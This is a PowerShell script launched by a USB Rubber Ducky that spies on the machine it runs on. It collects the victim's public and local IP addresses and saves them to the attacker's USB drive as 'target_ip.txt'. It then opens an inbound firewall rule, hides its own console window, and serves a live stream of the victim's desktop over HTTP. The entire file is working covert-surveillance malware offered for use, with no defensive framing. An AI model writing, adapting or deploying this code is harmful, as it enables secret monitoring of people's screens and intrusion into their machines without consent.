<#  
==================================== Beigeworm's Screen Stream over HTTP with Public IP Capture ====================================  
SYNOPSIS: Streams desktop to HTTP. Captures public IP and writes to USB drive (or desktop).  
USAGE: Host this script at #SCRIPTURL. Ducky payload will run it.

Key Features:  
- Gets public IP from multiple services.  
- Robust USB drive detection with test write.  
- Fallback to desktop if USB fails.  
- Separate error handling for IP fetch vs. save.  
- Starts HTTP server on specified port.  
- Press ESC for 5 seconds to quit.  
#>

$hide = 1  
[Console]::BackgroundColor = "Black"  
Clear-Host  
[Console]::SetWindowSize(88, 30)  
[Console]::Title = "HTTP Screenshare - Public IP Capture"  
Add-Type -AssemblyName System.Windows.Forms  
Add-Type -AssemblyName PresentationCore, PresentationFramework  
Add-Type -AssemblyName System.Windows.Forms  
[System.Windows.Forms.Application]::EnableVisualStyles()

if ($port.length -lt 1) {  
Write-Host "Using default port.. (8080)" -ForegroundColor Green  
$port = 8080  
}

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray  
$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }  
$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'Wi*' -or $_.Name -match 'Eth*'}  
$primaryInterface = $filteredInterfaces | Select-Object -First 1

if ($primaryInterface) {  
if ($primaryInterface.Name -match 'Wi*') {  
Write-Output "Wi-Fi is the primary internet connection."  
$localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress  
} elseif ($primaryInterface.Name -match 'Eth*') {  
Write-Output "Ethernet is the primary internet connection."  
$localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress  
} else {  
Write-Output "Unknown primary internet connection."  
}  
} else {  
Write-Output "No primary internet connection found."  
$localIP = "127.0.0.1"  
}

# --- PUBLIC IP FETCH (Separate try block) ---  
Write-Host "Fetching public IP address..." -ForegroundColor Yellow  
$publicIP = "Unknown"  
$services = @(  
"https://api.ipify.org",  
"https://checkip.amazonaws.com",  
"https://ipinfo.io/ip"  
)

foreach ($service in $services) {  
try {  
$publicIP = (Invoke-WebRequest -Uri $service -UseBasicParsing -TimeoutSec 5).Content.Trim()  
if ($publicIP -match '\d+\.\d+\.\d+\.\d+') {  
Write-Host "Public IP detected via $service: $publicIP" -ForegroundColor Green  
break  
}  
} catch {  
Write-Host "Failed to get IP from $service" -ForegroundColor Yellow  
}  
}

# --- SAVE PUBLIC IP TO USB DRIVE OR DESKTOP (Separate try block) ---  
if ($publicIP -ne "Unknown") {  
Write-Host "Attempting to save public IP to removable storage..." -ForegroundColor Cyan

$usbDrive = $null  
$savePath = $null

# Method 1: Look for drive with VolumeName containing "DUCKY", "USB", etc.  
$potentialDrive = Get-WmiObject Win32_LogicalDisk | Where-Object {  
$_.DriveType -eq 2 -and (  
$_.VolumeName -like "*DUCKY*" -or  
$_.VolumeName -like "*USB*" -or  
$_.VolumeName -like "*REMOVABLE*"  
)  
} | Select-Object -First 1

# Method 2: If none found, take the first removable drive.  
if (-not $potentialDrive) {  
$potentialDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1  
}

if ($potentialDrive -and $potentialDrive.DeviceID) {  
$driveLetter = $potentialDrive.DeviceID  
$testPath = "$driveLetter\test.tmp"  
$targetPath = "$driveLetter\target_ip.txt"

# Test if drive is ready to write.  
try {  
"TestWrite" | Out-File -FilePath $testPath -ErrorAction Stop  
Remove-Item $testPath -Force -ErrorAction Stop  
$savePath = $targetPath  
Write-Host "USB drive ready: $driveLetter" -ForegroundColor Cyan  
} catch {  
Write-Host "USB drive $driveLetter is not ready or write failed." -ForegroundColor Red  
}  
}

# If USB drive failed, fallback to desktop.  
if (-not $savePath) {  
Write-Host "Falling back to desktop save." -ForegroundColor Yellow  
$savePath = "$env:USERPROFILE\Desktop\target_ip.txt"  
}

# Write the IP and info.  
$logContent = @"  
Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  
Public IP: $publicIP  
Local IP: $localIP  
Port: $port  
"@  
try {  
$logContent | Out-File -FilePath $savePath -Encoding UTF8  
Write-Host "Public IP successfully saved to: $savePath" -ForegroundColor Green  
} catch {  
Write-Host "Failed to write file to $savePath. Error: $_" -ForegroundColor Red  
}  
} else {  
Write-Host "Public IP fetch failed. Skipping save." -ForegroundColor Red  
}

# --- FIREWALL RULE AND SERVER START ---  
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null  
$webServer = New-Object System.Net.HttpListener  
$webServer.Prefixes.Add("http://"+$localIP+":$port/")  
$webServer.Prefixes.Add("http://localhost:$port/")  
$webServer.Start()

Write-Host ("Local Network Devices Can Reach the server at : http://"+$localIP+":$port") -ForegroundColor Green  
Write-Host ("PUBLIC IP (for remote access if port forwarded): $publicIP") -ForegroundColor Magenta  
Write-Host "Press escape key for 5 seconds to exit" -ForegroundColor Cyan  
Write-Host "Hiding this window.." -ForegroundColor Yellow

sleep 4

if ($hide -eq 1) {  
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'  
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru  
$hwnd = (Get-Process -PID $pid).MainWindowHandle  
if ($hwnd -ne [System.IntPtr]::Zero) {  
$Type::ShowWindowAsync($hwnd, 0)  
} else {  
$Host.UI.RawUI.WindowTitle = 'hideme'  
$Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })  
$hwnd = $Proc.MainWindowHandle  
$Type::ShowWindowAsync($hwnd, 0)  
}  
}

# Escape to exit detection  
Add-Type @"  
using System;  
using System.Runtime.InteropServices;  
public class Keyboard {  
[DllImport("user32.dll")]  
public static extern short GetAsyncKeyState(int vKey);  
}  
"@

$VK_ESCAPE = 0x1B  
$startTime = $null

while ($true) {  
try {  
$context = $webServer.GetContext()  
$response = $context.Response

if ($context.Request.RawUrl -eq "/stream") {  
$response.ContentType = "multipart/x-mixed-replace; boundary=frame"  
$response.Headers.Add("Cache-Control", "no-cache")  
$boundary = "--frame"

while ($context.Response.OutputStream.CanWrite) {  
$screen = [System.Windows.Forms.Screen]::PrimaryScreen  
$bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height  
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)  
$graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)

$stream = New-Object System.IO.MemoryStream  
$bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)  
$bitmap.Dispose()  
$graphics.Dispose()

$bytes = $stream.ToArray()  
$stream.Dispose()

$writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/png`r`nContent-Length: $($bytes.Length)`r`n`r`n")  
$response.OutputStream.Write($writer, 0, $writer.Length)  
$response.OutputStream.Write($bytes, 0, $bytes.Length)  
$boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")  
$response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)

Start-Sleep -Milliseconds 33

$isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0  
if ($isEscapePressed) {  
if (-not $startTime) {  
$startTime = Get-Date  
}  
$elapsedTime = (Get-Date) - $startTime  
if ($elapsedTime.TotalSeconds -ge 5) {  
(New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)  
sleep 1  
exit  
}  
} else {  
$startTime = $null  
}  
}  
} else {  
$response.ContentType = "text/html"  
$html = @"  
<!DOCTYPE html>  
<html>  
<head>  
<title>Streaming Video</title>  
</head>  
<body>  
<img src="/stream" />  
</body>  
</html>  
"@  
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html)  
$response.OutputStream.Write($buffer, 0, $buffer.Length)  
}  
$response.Close()  
} catch {  
Write-Host "Error encountered: $_"  
}  
}

$webServer.Stop()  